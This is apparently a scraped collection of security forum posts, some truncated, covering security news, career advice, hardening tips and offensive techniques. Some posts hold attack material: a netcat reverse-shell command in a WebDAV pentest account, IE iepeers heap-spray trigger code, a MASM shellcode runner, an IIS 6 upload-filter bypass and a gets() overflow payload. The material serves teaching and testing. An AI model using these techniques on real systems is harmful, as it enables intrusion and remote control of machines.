"  That\'s a good attitude micr0 that you went an extra mile and exploited the vulnerability. Any lazy bone could have easily escaped by reporting it a low severity vulnerability to client.  Your attempt reminds me of an attempt I made during a Pentest:  1. Determination of HTTP methods enabled on server:    2. Testing ""write"" access on webroot directory or guess a few: Testing using HTTP PUT command:    The following confirmed that PUT worked:   3. Metasploit auxiliary module webdav_website_content See the usage here. It helps to find the directories and files.    4. Davtest.pl perl script to find what kind of files are allowed to upload and execute: Available here    5. Usage of cadaver to upload files:    Since .exe could not be uploaded, uploaded files with .txt extension and then renamed back to .exe. 4 files were uploaded: 1. nc.exe - net cat 2. dmc.exe (which is actually cmd.exe taken from local computer). This helps when attacker does not posses enough privilege to use cmd.exe of target machine. 3. nc-bkd.exe - Hard binded to execute some command like ""nc.exe -n [IP] [Remote-port] -e dmc.exe"" 4. plink.exe for some other use  6.

In this scenario, we will assume that we want our webdriver to go via a locally set up TOR SOCKS proxy running on port 9050. The code for adding proxy setting in Firefox is:   Code: def install_firefox_proxy(PROXY_HOST,PROXY_PORT): fp = webdriver.FirefoxProfile() fp.set_preference(""network.proxy.type"", 1) fp.set_preference(""network.proxy.socks"", PROXY_HOST) fp.set_preference(""network.proxy.socks_port"", int(PROXY_PORT)) fp.update_preferences() return webdriver.Firefox(firefox_profile=fp)# To create our webdriver with these settings, we can simply call this asdriver = install_firefox_proxy(""127.0.0.1"", 9050)# Check if this worksdriver.get(""http://ip.telize.com"").source_code  For adding the same functionality to a PhantomJS webdriver, we can use the following code:   Code: # PhantomJS Driverservice_args = [ \'-' + '-proxy=127.0.0.1:9050\', # You can change these parameters to your liking. \'-' + '-proxy-type=socks5\', # Use socks4/socks5 based on your usage. ]driver = webdriver.PhantomJS(service_args=service_args)# Check if this worksdriver.get(""../ip.telize.com"").source_code Hope this helps.

"  Dear friend,  The conclusion to your first query is that sniffing data is possible. Once you get access to the router, you can have the DNS Redirection attack. In this attack you can change the DNS setting with you own controlled DNS servers. And if proper channel is made then packets can travel via your own controlled network.  For the ARP attacks, you can read my article on it in this same section. ARP attacks cannot be carried out with router due to some limitations in the protocol and broadcasting as discussed with ""vinnu"" bro. Successful ARP attacks can only be carried out in LAN as ARP is 2nd layer protocol of TCP/IP suite and can not cross the router (Data Link Layer protocol i.e. layer 2 from bottom).

"  In this thread i will be discussing 5 different types of rootkits,   * Firmware  * Kernel  * Persistent  * Application  * Library   But first a little something about rootkits. A rootkit is a backdoor program that allows the hacker remote access to the victims computer. A well known example of rootkits in use was when Sony BMG installed root kits on there CDs as a secret campaign to fight back against copyright and piracy.  Firmware Rootkits Firmware rootkits are actually embedded within the firmware of devices such as network devices. The root kit would always be available as long as the device is. And can be harder to detect. Thats why its good to let your anti virus scan every device that you plugin.  Kernel Rootkits A kernel rootkit is embedded within the operating system core itself. People mostly find these form of rootkit when they are using an illegal copy of an operating system.  Persistent Rootkits When the system starts up the rootkit starts up and stays running until the system is shutdown, and even if the system process is ended it will restart the process.  Application Rootkits When a specific program is run the rootkit will start up, and when the program is ended the rootkit is ended.  Library Rootkits In software applications that use code library files such as windows ddls. The rootkit can intercept specific systems and API calls and replace them with its own code.  Most anti viruses can detect root kits but they can also be a pain in the ass to remove. Depending on the type of rootkit sometimes its easer to re-install the OS  Check out the original thread at Tech Forumz","D4Garage4hackers","NO"

"  [+] Port Scanning with Python 1. Introduction Port scanning is very important technique to probe a host for open ports. We can define it as trying to connect to the host from a list of ports, with the goal of finding an active ports and identifying running services on a targest to pentest it.  We can connect to any machine attached to the network using TCP/IP Protocol, by providing it\'s address and port number. Port number varies from 1 to 65536. As a result of scan on a port, we can get: [+] Open or Accepted: The host established a connection [+] Closed, Denied or Not Listening: The specified port is closed  Read more - http://goo.gl/iEz6FJ","D4Garage4hackers","NO"

"  Automating Finding the MAC address part: <br> <br>Here is little add on, something I experienced recently, Consider the scenario where u have an IP that u have never interacted with, my objective was to obtain the MAC adress of that device. But as I have never interacted with that device my arp table does not know that systems MAC. All u have to do is Send some ping request to that IP. And ur arp table will have the mac updated. <br> <br>I was trying to automate the finding MAC address of a system. <br> <br>1) ping Destination_Source -' + '- this will add the device MAC to our ARP cache. <br> <br>and read our arp table to obtain mac. <br> <br>2) Another way is using Netbios , only for windows. A netbios query on port 137, 135 would be able to provide the MAC, these are the possible way I know to retrieve a systems MAC. Please add if u are aware of any other.","D4Garage4hackers","NO"

"  Security experts are warning webmasters over a series of attacks targeting the WordPress and Joomla publishing platforms.  The Sans Institute said that it has received reports of multiple exploit attempts on the platforms. The compromised sites are then injected with code which redirects to a third-party site.  John Bambenek, Sans blogger and president of security firm Bambenek Consulting, said that the attacks were particularly interesting for their method of attempting to exploit pages en masse by targeting servers.  ""The interesting thing to note is that it doesn\'t seem to be a scanner exploiting one vulnerability but some tool that\'s basically firing a bunch of Joomla and Wordpress exploits at a given server and hoping something hits,"" he explained.  Sans said that the compromised sites are used to redirect users to an attack site which tries to infect users with a phony antivirus package. Such payloads are often used to trick users into paying for ""registration fees"" and other fraudulent charges.  Webmasters and administrators are being advised to update their software to avoid an infection.  ""Mediation is your typical advice, make sure all your software is up-to-date and kept that way on a regular basis,"" Bambenek said.  Wordpress has previously been the target of malware attacks.

"  Now let us consider few real world vulnerabilities and develop the exploits with above heap sprayer. <br> <br> <br>1.

Also study the performance graph of memory and cpu in taskmanager for <br>better understanding the heap spray technique. <br> <br> <br>2. IE iepeers: <br> <br>The following code can trigger the vulnerability in ieepeers.dll in internet explorer: <br> <br> <br> <br> <br> <br> <br> <br>spray=new Array();var i=0; <br>for(i=0;i<br>function trigger(){ <br>var varbdy = document.createElement(\'body\'); <br>varbdy.addBehavior(\'#default#userData\'); <br>document.appendChild(varbdy); <br>try { <br>for (iter=0; iter<br>varbdy.setAttribute(\'s\',window); <br>} <br>} catch(e){ } <br>window.status+=\'\'; <br>} <br>document.getElementById(\'butid\').onclick(); <br> <br> <br> <br> <br>So for above vulnerability, following is the heap spray exploit with calc.exe shellcode: <br> <br> <br> <br> <br> <br> <br> <br> <br>The spray area for iepeers exploit for IE6 is small and thus exploit runtime is efficiently faster. <br> <br> <br>The story doesnt end here, study more for more expertisation over code execution and heap spray technique...""vinnu""","D4Garage4hackers","YES"

"  But in windows 8 there is protection implemented in Virtual memory manipulating functions like VirtualProtect, VirtualAlloc, etc. The protection checks for the stack pointer (ESP register) to be inside the permitted range. And prior to execute the VirtualProtect function in our ROP chain, the stack pointer (ESP register) is checked to be present within this range. The range is taken from the TEB (Thread Environment Block), where stack\'s initial value and stacklimit are saved.  If the ESP is greater than stacklimit or less than initial value, then it means a stack pivote has been carried out and and this will lead to raising an exception and failing the exploitation attempt.

"  It has been an embarrassing week for security firm HBGary and its HBGary Federal offshoot. HBGary Federal CEO Aaron Barr thought he had unmasked the hacker hordes of Anonymous and was preparing to name and shame those responsible for co-ordinating the group\'s actions, including the denial-of-service attacks that hit MasterCard, Visa, and other perceived enemies of WikiLeaks late last year.  When Barr told one of those he believed to be an Anonymous ringleader about his forthcoming exposÃ©, the Anonymous response was swift and humiliating. HBGary\'s servers were broken into, its e-mails pillaged and published to the world, its data destroyed, and its website defaced. As an added bonus, a second site owned and operated by Greg Hoglund, owner of HBGary, was taken offline and the user registration database published.  Over the last week, I\'ve talked to some of those who participated in the HBGary hack to learn in detail how they penetrated HBGary\'s defenses and gave the company such a stunning black eyeÂand what the HBGary example means for the rest of us mere mortals who use the Internet.

The only programming experience I had in my life was in vb and pl/sql in 12th standard and I agree that it can\'t be considered as a programming experience. It would be of great help if you could just help me with some doubts.  1. Where should I start the very beginning of my journey?  Seen the slide ""Breaking into Security"" and understood that learning to code is of great help.  From the article ""How to become a hacker?"" by Eric S Raymond (Thank you sir), it was clear that Linux is also an inevitable factor in hacker culture.   Please point me to the right place to begin from even if its not with Linux or programming.  2. Where should I focus towards in the learning process? Actually, I do not know where to specialize in Information Security field. Penetration Testers are he most common white hat hackers as far as it read. But what can be the base of selecting a key area for skill development, research and specialization?  Please feel free to mention any important points I have not asked here. Thank You Guys.

"  ################################################## ########## # Microsoft IIS 6 parsing directory Vulnerability ################################################## ########## #Discovered by: Pouya daneshmand whh_iran[AT]yahoo[DOT]com http://securitylab.ir/blog  #Introduction: Using this vulnerability you can bypass some Security filters, for example a file with Â.jpgÂ or Â.rarÂ extension can be executed as an asp (Active Server Page) file.  #Vulnerable: It just works for asp files and works on Windows 2003 / IIS 6 (As I tested...). The test failed on IIS 5.1 and IIS 7.   #Description: 1) Create a Folder with \'.asp\' extension. 2) Insert your ASP code in a file with any extension (like .jpg,.rar,.txt) in the folder you have created. 3) Open the file with your browser and you will see it\'s executed as an asp file!  #Note: The Extension of file does not matter at all!   #Solution: There is no patch to fix this security vulnerability yet, the best thing I can say is to DISABLE ASP FILES FROM YOUR ""web server extensions""! Or Remove ÂexecuteÂ permission from the upload directories.    #PS: This vulnerability was reported for first time at 2010-06-19 in Persian (http://sebug.net/vulndb/19820/)  #Original Advisory: http://securitylab.ir/blog/dl/Micros...nerability.pdf http://securitylab.ir/blog/posts/11/...Vulnerability/","D4Garage4hackers","YES"

By leveraging this issue, an attacker may be able to cause arbitrary HTML to be executed in a user\'s browser within the security context of the affected site.  The remote web server may be vulnerable to IFRAME injections or cross-site scripting attacks :  - IFRAME injections allow \'virtual defacement\' that might scare or anger gullible users. Such injections are sometimes implemented for \'phishing\' attacks.  - XSS are extensively tested by four other scripts.

"  Pen-testing/Vulnerability assessment is a mixture of what so called, ""Black-box testing"" and ""White-box testing"". Any company/organization follow some sort of protocol for standards, the intentions are like, ""get it, do it"" but the sole intention is to complete the project and get the revenue generated. In an application testing from developers/vendor point of view, its solely depends on a ""Black-box analogy"" as they are not much concern about the end-users gullibility, there actual concern is to see that the parts of the application exposed are working correctly. But, from a pen-testers view, the analogy simply changes to other end.  Methodology is just a starting process according to me, because, it solely depends upon the scenario we are about to face, consider a Network Security Assessment, we need to analyze needs for example, couple of years back I wrote an article on Network Security Consideration. when you have considerations in mind, you approach to figure out the security consequences you are about to face for your vulnerability assessments, as it solely depends upon the Organizations/Company\'s infrastructure you are dealing with, methodology is similar to a simple program/diagnosis network issue, like,  Its just the process of approach towards a problem. Most importantly the methodology is in place to over come the issues faced on-site vulnerability like, Enterprise Security auditing in place, or Enterprise Network Security Assessments, where as pen-tester, you just cannot follow your methodology and fuck up the network which in turn which effects the Revenue generation process which may get into trouble.

"       - Exploit Development  A lot of guys learn exploit writing and are finding new flaws each day. What\'s better, they should study old exploits firsts, convert exploit-db/injector stuffs into Metasploit formats so that everyone can use it right away. Similarly, they should do exploit development in Metasploit platform.    Sorry, Metasploit is not a standard exploit platform, it is free it doesnt mean it can be used at every situation.  People work in different situations hence different scenarios, so they used to develop generic exploits.  But there are other people who rely on some softwares like metasploit, so some people just convert those generic exploits to metasploit \'s also.  No one can force a hacker to use someone\'s tools, as most of experts whether a carpainter, and engineer an architect ... all develop and shape their own tools.  Such a thinking will lead to a total compromise one day.  Moreover, in highly confidential scenarios, they cant use any external world\'s softwares or tools.  So a hacker needs to continuously develop own tools. No problem whether u reinvent the wheel, but atleast u are sure, that it doesnt leak ur precious info.  Moreover, a nessuss and nmap and metasploit cannot make a hacker. Anyone who has these tools, does not means he becomes a hacker.  But the man who can develop such tools, is actually a hacker.

Got a small bug File Disclosure bug in Panel. * become good boy and reported to Vendor as it is opensource project*  Waited for 4+months : No reply. Followups. No reply! patching other bugs.

In the past we have seen that using SQL injection, attackers have got access to whole database of the target, thus leading to total compromise.  SQL injection along with DDOS and cross site scripting has been used widely by attackers. In past, we had seen notorious groups like Lulzsec taking down many private and government firms with SQL injection attack. OS command injection came at the number two position, which is when unfiltered parameters are used as part of a command to be executed by the underlying operating system.Classic buffer overflows came in third position.

"  Hi Darwinblaine,  Since there are lots of things, I will try to cover a whatever I can think of right now. Here are some of the things that you can do to secure you SSH:   Disable root login on your server -      To disable root SSH login, edit /etc/ssh/sshd_config with your favorite text editor.  [root@root ~]# vi /etc/ssh/sshd_config Change this line:  #PermitRootLogin yes Edit to this:  PermitRootLogin no   Source: https://mediatemple.net/community/pr...-the-root-user  Disable password based login and switch to using on key based auth. There are various sources available on internet. Something like this would work - https:../www.digitalocean.com/communi...a-linux-server.  If you know that your client IP is going to stay static, you can allow access to only specific IPs using IPtables. Something like this - https://unix.stackexchange.com/quest...her-connection  It is recommended that you install fail2ban on server to stop bruteforce attack. Guide like this should work - https:../www.digitalocean.com/communi...n-ubuntu-14-04.  You can deploy port knocking to hide your SSH daemon. How to do this here - https:../www.digitalocean.com/communi...kers-on-ubuntu.  You can also follow instructions from this guide - https:../www.cyberciti.biz/tips/linux...practices.html.   It would also help if all of the services on your server are configured properly, patched and on latest version. Also make your server is patched, as to not allow local privesc. I would suggest you only run the services that you need.  These are some of the things that I could think of. I am sure others can contribute much more.   Cheers, c0dist.","D4Garage4hackers","NO"

"  Hey mandi,  Here are the answers to your queries:  1. Use OPTIONS to find out HTTP methods supported by the web server. The ""Allow"" header in server response will have HTTP methods supported by web server. The procedure has been demonstrated on the same page of OWASP testing guide you mentioned.  2. There are other HTTP methods as well apart from basic 8. For example, when WebDav is used, it supports PROPFIND, LOCK, etc HTTP methods. for more information, see here.  3. No, but web servers can be checked for buffer overflow/format string vulnerabilities via HTTP methods. Check Exploits Database by Offensive Security for web server exploits. The exploits can be used to compromise the web servers. Example.  4. I didn\'t understand this. Please read RFC 2616.  5. This link can be useful to understand GET and POST methods. To identify GET/POST methods, use HTTP proxy softwares like burp suite, Paros Proxy, webscarab, etc. These softwares sits between client browsers and web server allowing use to view and manipulate any http request.  Hope this will satisfy your queries.  Cheers, AMol NAik","D4Garage4hackers","NO"

"  On Sunday, the 28th of November 2010 around 20:00 UTC the main <br>distribution server of the ProFTPD project was compromised.

"Respected members, Recently I came across a situation where I found an issue but I cannot exploit it. I am in dilemma whether I should report it or not. The issue is XEE: XML Entity Expansion. XML entities have been expanding as part of an error message. Content of error message is truncated after 4 entities. So I can expand up to only 4 entities. Now my questions are: 1) Is this really a qualified XEE case? 2) Would you report it or not? If you decide to report, would you name it as ""Potential XEE"" or just ""XEE""? 3) How should we report in cases of asynchronous vulnerabilities like Blind Second Order SQL Injection, Blind XSS etc? Please share your valuable thoughts. Regards, Nagpradis","D4Garage4hackers","YES"

The vulnerabilities in question have already been fixed by the respective vendors, but as most were reported directly to those vendors, specific details were never made public. Exploit developers and contributors can claim a vulnerability, which gives them one week to work on a module and deliver a suitable exploit.  Should they fail to do so, the exploit will no longer be reserved and will be open again to the community. The top five vulnerabilities for which the team is offering the maximum bounty include a vulnerability affecting DNS name queries in Windows; this can be exploited by an attacker on the same network using crafted broadcast packets to take control of another computer.

"  VLAN hopping (virtual local area network hopping) is a computer security exploit, a method of attacking networked resources on a VLAN. The basic concept behind all VLAN hopping attacks is for an attacking host on a VLAN to gain access to traffic on other VLANs that would normally not be accessible. There are two primary methods of VLAN hopping: switch spoofing and double tagging.    Most network engineers have been told at one point or another never to use VLAN 1 for user access. The motivation behind this warning is the result of fear concerning VLAN hopping attacks, wherein an attacker can send packets with a specially-crafted 802.1Q header(s) to ""hop"" from one VLAN to another. This theory relies on the assumption that a switch will happily forward 802.1Q-tagged frames ingressing an access port.  Experimenting with VLAN hopping a gud article.

"  The concept i am discussing is same as of injector but.. In the case of injector we inject the code into the another process although it was a nice and clean approach but there is a possibility that it may crash target process.. So now i am presenting a dirty solution to the problem keeping the core concept same i.e ""don\'t compile code(shellcode) or generate exes, use a stub that will execute the code somehow""  Tech:  Instead of injecting the code into the another process.. we can inject the code into the stub program (that will read file) and can run the code inside stub.. 1. we will read the shellcode file 2. Now the file contents are in memory so we can jump to that location.. 3. After jump our code will be executed..  Note:  1) it is not flexible bcz we can\'t play with multiple shells at the same time experiment   POC Code:  Code: ;Author: DouBle_Zer0;Self Execution POC;Date: 28-03-11;MASM Supported File.386.model flat,stdcalloption casemap:noneinclude windows.incinclude kernel32.incinclude msvcrt.incincludelib kernel32.libincludelib msvcrt.lib.datatxt db ""Plz enter the name of file: "",0stxt db ""%s"",0.data?vpointer dd ?fsize dd ?fname db 20 dup(?)hnfile dd ?bread dd ?.code start:invoke crt_printf,addr txtinvoke crt_scanf,addr stxt,offset fnameinvoke CreateFile,offset fname,GENERIC_READ+GENERIC_WRITE,NULL,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULLmov hnfile,EAXinvoke GetFileSize,hnfile,NULLmov fsize,EAXadd fsize,100dinvoke VirtualAlloc,NULL,fsize,MEM_RESERVE+MEM_COMMIT, PAGE_EXECUTE_READWRITEmov vpointer,EAXinvoke ReadFile,hnfile,vpointer,fsize,offset bread,NULLjmp vpointerinvoke ExitProcess,0end start ","D4Garage4hackers","YES"

"  Hey abhay well Drive by Download is just the phrase used to address all kind of malware installation with out user knowledge. So all the browser,plugin exploits use a Drive By download payload. <br> <br>     ""Why do we need extra malware.exe in both Drive-by-download and Drive-by-cache""   Consider the case that you wan embed a metpreter unicode shellcode[js shellcode is a wrong term] in your exploit, embedding a large shellcode directly on to your exploit is never a good idea even though it\'s possible. So always a download and execute shellcode is used. So that shell code later download any huge exe and execute them. <br> <br>     Is it because shellcode in js can only be of limited size and malware.exe is independent and can be of desired size ?   I think you are talking about the same thing which I mentioned above. <br> <br>Drive-by-cache in simple terms yet another drive by download method, that could be used to prevent AV evasions. When your browser tries to execute such shelloded ""downlod execute"", they are often flagged by AV. <br>http://www.garage4hackers.com/showth...ploy+shellcode I have mentioned the same scenario here. <br> <br>So drive by cache is just another evasion methodology, where a js/vb/auction script is used to force your browser cache to hold a specified binary . <br> <br> Code: Now that our browser cache got a copy of the payload, the actual shell-code would be to search the cached payload and execute .","D4Garage4hackers","NO"

"  okay I should post the answer now .. pity no one bothered to answer  1. On the boot , when the GRUB screen is loaded , you can press E to edit the arguments with which that ""GRUB entry"" boots.   Now you can add the single argument and delete other unnecessary arguments to edit a entry.Booting with this entry now will give you root shell because of the single argument which defaults to unknown runlevel and root user.   2. To prevent this , you can use a utility called grub-md5-crypt which will ask you for a password and give you md5 hash of that.Which you can paste it in your grub file.( This utility is either called directly or can be found in grub directory.Or you can get it from grub terminal )  Editing the GRUB file :  Just below the timeout line,  Code: default 0timeout 10 add the hash you generated by grub-md5-crypt in the following syntax  Code: password -' + '-md5 $1$gLhU0/$aW78kHK1QfV3P2b2znUoe/ And this will force the grub to ask for a password if anyone wants to change the arguments at GRUB screen.     3. To prevent use of LiveCD or LiveUSB , disable CD and USB as boot options in BIOS and set up a BIOS password. Also hope no one messes with the CMOS battery ","D4Garage4hackers","NO"

"  Prashant is right. Let me elaborate, actually when it comes to DOS attack against a browser, we are generally dealing with buffer overflow exploits against their native frameworks. When it comes to attacking Firefox, Opera, IE, Safari, QT, then we are dealing with different frameworks and engines which power these, for eg, webkit powers safari and chrome, so whenever an exploit is found that works on native webkit framework,greater chances are that it will work on chrome & safari, however again, several code optimizations may protect the browsers against the native exploit. SO, when we are dealing with an exploit (lets take the above javascript one) that works on IE , it will not work on Chrome as the javascript rendering engine is different and hence the way of handling code parameters.","D4Garage4hackers","YES"

"  SQL Injection flaws are introduced when software developers create dynamic database queries that include user supplied input. To avoid SQL injection flaws is simple. Developers need to either: a) stop writing dynamic queries; and/or b) prevent user supplied input which contains malicious SQL from affecting the logic of the executed query. <br> <br>This article provides a set of simple techniques for preventing SQL Injection vulnerabilities by avoiding these two problems. These techniques can be used with practically any kind of programming language with any type of database. There are other types of databases, like XML databases, which can have similar problems (e.g., XPath and XQuery injection) and these techniques can be used to protect them as well. <br>Primary Defenses: <br>Option #1: Use of Prepared Statements (Parameterized Queries) <br>Option #2: Use of Stored Procedures <br>Option #3: Escaping all User Supplied Input <br>Additional Defenses: <br>Also Enforce: Least Privilege <br>Also Perform: White List Input Validation <br> <br>Read Full Cheat Sheet:https:../www.owasp.org/index.php/SQL_...on_Cheat_Sheet","D4Garage4hackers","NO"

I am going to extend my OffSec PWK Labs in a couple of hours as my first part of enrollment got messed due to my improper schedule and management of time. I have completed watching the videos and almost completed reading my PDF materials, I am practicing with Boot to Root Distributions like De-ice and Kioptrix. I remember in the last chat with b0nd in April 2014 telling me the 3 mantras to get success, 1)Passion, 2)Patience and 3)Hard Work. I am working on it. Do I have to learn any important topic and practice any important skill other than those that I have mentioned above? I know in the field of InfoSec, the harder way you learn is going to matter a lot, but this period is what I consider crucial for my career. But I would like to request you people to provide me some guidance if possible. I am more determined this time and doesn't want to get drifted away rather than getting my OSCP Certification.

"  Namaste, First of all, we must settle on teh definition of ""Non-Technical Background"". If you think that coming form some non professional academic qualification makes you non-technical then you might be surprised that several successful infosec researchers are under undergraduates. Some are working in their teenage while still studying there high school education. An infosec ninja is a Jack of All Trades. It is the attitude towards security and problems that drives these ninjas instead of bunch of certifications and degrees. Knowing languages is a plus point. But the real thing that you need is the ""Problem Solver Mindset"". In infosec, most of the jobs are fulfilled by pre scrutiny of newcomers by experts, it doesn\'t need you to apply for job anywhere sometimes. The candidate may not have the knowledge that he is being scrutinized. Instead it is the work and ideas that you share and discus openly. Your discussions and notes/work will make your destiny. In infosec we do not chose the job, rather it is the JOB that chose us. And it selects us based on our mindset, our attitude towards problems.  Keep in mind that in this field, we everyday every moment strike with bizarre problems which need pioneering approach and technique to solve them. So we have to keep on learning, here fresher and experienced both are at same level, because after all it is your creativity that makes the job done here instead of bunch of experience listings on your resume.

"  SourceForge.net is one of the most popular locations for software developers around the world, hosting millions of open-source projects. According to Wikipedia, SourceForge reached more than 230,000 projects and has more than 2 million registered users in February 2009. The website was attacked and hacked previously.  SourceForge was attacked and compromised on Wednesday. A blog post by the SourceForge staff stated that ÂWe detected a direct targeted attack that resulted in an exploit of several SourceForge.net servers, and have proactively shut down a handful of developer centric services to safeguard data and protect the majority of our services.Our immediate priorities are to prevent further exposure and ensure data integrity. We have all hands on deck working on identifying the exploit vector or vectors, eliminating them, and restoring the impacted services.Â  The update about the attack were also made on yesterday by the SourceForge staff stating that several servers were compromised in this attack. They are working to chart the full extent of the attack, to validate data against known good backups, and to protect the majority of their services.CVS, ViewVC, file release uploads, and interactive shell services are still disabled while they do the work to make sure that their servers and services are hardened against future attacks like this. It seems that large commercial and community driven websites are not conscious about their security. We hope SourceForge fixes all the compromised servers soon as it is one of the biggest online community of open source softwares.  source: http://blog.secfence.com/2011/01/sou...-hacked-again/","D4Garage4hackers","NO"

"  A new zero-day exploit in Microsoft Windows was disclosed today. The exploit allows an application to elevate privilege to ""system,"" and in Vista and Windows 7 also bypass User Account Control (UAC). <br>The exploit takes advantage of a bug in win32k.sys, which is part of the Windows kernel. The flaw is related to the way in which a certain registry key is interpreted and enables an attacker to impersonate the system account, which has nearly unlimited access to all components of the Windows system. The registry key in question is under the full control of non-privileged users. The flaw appears to affect all versions of Windows back to at least Windows XP, including the latest Windows 2008 R2 and Windows 7 systems.

"  That PC keyboard you\'re using may be giving away your passwords. Researchers say they\'ve discovered new ways to read what you\'re typing by aiming special wireless or laser equipment at the keyboard or by simply plugging into a nearby electrical socket.  Two separate research teams, from the Ecole Polytechnique Federale de Lausanne and security consultancy Inverse Path have taken a close look at the electromagnetic radiation that is generated every time a computer keyboard is tapped. It turns out that this keystroke radiation is actually pretty easy to capture and decode -' + '- if you\'re a computer hacker-type, that is.  The Ecole Polytechnique team did its work over the air. Using an oscilloscope and an inexpensive wireless antenna, the team was able to pick up keystrokes from virtually any keyboard, including laptops. ""We discovered four different ways to recover the keystroke of a keyboard,"" said Matin Vuagnoux, a Ph.D. student at the university. With the keyboard\'s cabling and nearby power wires acting as antennas for these electromagnetic signals, the researchers were able to read keystrokes with 95 percent accuracy over a distance of up to 20 meters (22 yards), in ideal conditions.  Laptops were the hardest to read, because the cable between the keyboard and the PC is so short, making for a tiny antenna. The researchers found a way to sniff USB keyboards, but older PS/2 keyboards, which have ground wires that connect right into the electric grid, were the best.  Read more","D4Garage4hackers","YES"

"  Hi Hackinglife. This is the same restless stage I have gone through. After preparing for a target course, I would strongly advice you to go for OSCP. This is the course that will set you apart from others. But before that you need to meet some basic requirements so that you don\'t suffer in middle of the course. Get good command in Linux, learn Python (it will help you during final test for creating a plan for auto reconnaissance and save your time alot), get/study CCNA, go through CEH cbt nuggets study material (by james conrad i guess, learn the basic fundamentals), must learn Assembly language. It could take approx. 1 yr. Then you should be ready to for PWB/OSCP. Don\'t expect for a good paying job initially. You may have to work without payment also in order to gain experience. I have seen people working on short term contracts basis with XXX company without getting paid (just for experience). After getting OSCP you will yourself get to know what to do next.

"  Hi Folks. You have probably heard that today is World IPv6 Day, with sites like Google, Facebook, and Yahoo publishing IPv6 records for their main web sites.  I\'m happy to report that the Nmap Project is celebrating in several ways:  ==Scanme Updated to IPv6== You probably know that we run the machine scanme.nmap.org as a system people are allowed to use as a target for test scans and the like. That system now has native IPv6 support. So if you have never performed an IPv6 port scan, you can do so with a command like:nmap -6 -v scanme.nmap.org  We also added a DNS record for scanmev6.nmap.org, which only has an IPv6 address (no IPv4). This can help for tools which might otherwise use Scanme\'s IPv4 address by default rather than IPv6. For example, you can insure that your web browser is connecting to the IPv6 version of the Scanme web site by visiting: http://scanmev6.nmap.org/ You might expect that to fail if you haven\'t done any IPv6 setup, but you might be surprised! Many operating systems can automatically set up various types of IPv6 tunnels as needed. Give it a try!   ==Nmap Web Sites==  All of our main web sites (Nmap.Org, Insecure.Org, SecLists.Org, SecTools.Org) are now reachable by IPv6.   I\'ve noticed that some other participants have been using ""vanity"" IPv6 addresses: www.facebook.com -2620:0:1c18:0:face:b00c:: www.cisco.com -2001:420:80:1:c:15c0:d06:f00d www.bbc.co.uk -2001:4b10:bbc::2 So we\'re proud to fly our 2600 flag! nmap.org -2600:3c01::f03c:91ff:fe96:967c Admittedly that is a coincidence, but we\'re still happy about it -fydor","D4Garage4hackers","NO"

The first case took place in 2008 and involved the case of John Darwin, who was dubbed ""Canoe Man"" by the British press after he disappeared in one during a jaunt on the North Sea in 2002. Darwin faked his death so that his wife Anne could collect the life insurance money, and stayed hidden for five years before turning himself in to police in London, claiming he was suffering from amnesia.  Darwin\'s story soon fell apart under examination Â not least when the press uncovered a photograph, published online, of him and his wife with a Panamanian real estate agent. A Sky News reporter asked for and was approved to hack into a Yahoo! email account thought to be used by the Darwins, and uncovered evidence that his wife was in on the scam, which was handed over to the police and used in the trial of Anne Darwin.  ""We stand by these actions as editorially justified,"" said Sky News in a statement. ""As the Crown Prosecution Service itself acknowledges, there are rare occasions where it is justified for a journalist to commit an offence in the public interest.""

"  Visionary Password Manager  This is a program that manages your passwords without storing anything. Normal password managers generate a password, encrypt it, and then store or sync it somewhere. This can be bad because if your encrypted data is lost, you\'ve lost it all. Also, you can\'t always sync your passwords everywhere.  Visionary improves on this. You only have to memorise one, secure master password. You specify keywords for different services, like `server` for your server, `facebook`, `not_porn`, whatever. And it uses your master password and the keyword to generate a secure password. It\'s very difficult to brute force as the algorithm uses scrypt.

Ok the solution is as follows ...  Ideally it will take 24 bytes to overflow the flag variable. Now the thing that may confuse you is the \\x00 byte which is the string terminator.. But gets() doesnt consider \\x00 as the string terminator, it considers \<br>(\\xa) as the string terminator.. So all you need to give is 20 bytes of junk + 0x41420043 in little endian format  Like this... assume the program object file is named test...  then , $printf ""%020x\\x43\\x00\\x42\\x41"" | test you win $ Hope you enjoyed this...

However, for this script it suffecient, for test command used, but remember if you are opting only one argument with the script, force/limit the user to use only one argument. You will find how important it is in your further learnings when you using multiple arguments. I mean,   PHP Code: <br>if [ ! $# == 1 ]\r then\r echo ""Usage: $0 [ File-Name ]""\r exit 1\r fi \r <br><br>It forces/limits the user for only one argument.       if [ ""$EXT"" = ""cpp"" ] ; then #Determing whether it\'s C or C++ by file extension  DIR=\'usr/include/c++/4.6.3/default.htm\' #C++ include directory  elif [ ""$EXT"" = ""c"" ] ; then  DIR=\'usr/include/default.htm\'   2. Small Mistake, which actually most of the new bash script learners does. Consider even I pass the right argument, as ""somefile.cpp"" file, your script never works for me. Why? because, your variable ""DIR"" fails, because, I don\'t have ""4.6.3"" directory. I have ""4.7"" version, so do I have directory ""4.7"" at ""/usr/include/c++"". So, it is always, suggested to use a variable for application related directory\'s somewhat like,  PHP Code: <br>VDIR=`ls -F /usr/include/c++ |grep /`\r DIR=/usr/include/c++/$VDIR/\r .... \r <br><br>Happy Bashing.  -Hackuin","D4Garage4hackers","NO"

He disclosed that the entire series of routers, cable modems and other networking devices from big manufacturers are vulnerable to UPnP attacks over the Internet. The UPnP was discovered by Microsoft which allows applications to discover network gateways automatically and ask them to forward traffic on special ports back to the computers they are running on. <br> <br>Umap, the tool he made while researching, detects UPnP-enabled end devices such as DSL routers and cable modems on the internet by directly retrieving the devicesâ XML descriptions. The required URLs and ports for some models are hard-coded into the tool. This enables the software to bypass the usual restriction that only allows UPnP to search for compatible hardware via multicast in local networks. Garcia says that entire device series by Edimax, Linksys, Sitecom or Thomson ( respond to UPnP requests on their WAN interfaces as reported in the blog. He claims to have identified over 150,000 potentially vulnerable devices in a short period of time by using Umap. The scanner is also capable of sending requests containing AddPortMapping or DeletePortMapping commands to the exposed UPnP interfaces. <br> <br>Some protection measures that can be taken is to disable WAN UPnP access if possible from the routerâs administration interface, or finally replace the device with one that doesnât have this feature! <br> <br>Source","D4Garage4hackers","YES"

